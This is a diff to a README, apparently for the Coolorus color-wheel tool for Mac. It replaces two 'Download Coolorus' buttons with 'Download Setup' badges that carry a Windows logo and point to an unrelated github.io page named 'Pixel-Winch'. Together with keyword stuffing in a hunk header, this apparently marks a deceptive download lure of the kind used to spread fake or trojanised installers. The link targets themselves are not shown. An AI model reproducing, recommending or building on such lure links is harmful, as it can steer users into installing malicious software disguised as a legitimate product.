@@ -2,12 +2,7 @@
 
 ![Coolorus App Icon](https://static.macupdate.com/products/49272/m/coolorus-for-mac-logo.png?v=1590176471)
 
-<!-- Download Button #1 — shield/badge style -->
-<div align="center" style="margin:14px 0 18px;">
-  <a href="https://rumpels-kaji.github.io/.github/Coolorus">
-    <img src="https://img.shields.io/badge/⬇️_GET_COOLORUS_FOR_MAC-orange?style=for-the-badge&logo=adobe&logoColor=white" alt="Get Coolorus for Mac">
-  </a>
-</div>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://moshefranklinrofy.github.io/.github/Pixel-Winch)
 
 
 ---
@@ -145,9 +140,4 @@ coolorus • coolorus mac • color wheel mac • color picker macOS • artist 
 
 ---
 
-<!-- Download Button #2 — pill/gradient style -->
-<div align="center" style="margin:20px 0 24px;">
-  <a href="https://rumpels-kaji.github.io/.github/Coolorus" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#ff7e5f,#fbd786);color:#1a1a1a;font-weight:900;text-decoration:none;box-shadow:0 10px 24px rgba(0,0,0,.16);">
-    🎯 Download Coolorus for macOS
-  </a>
-</div>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://moshefranklinrofy.github.io/.github/Pixel-Winch)
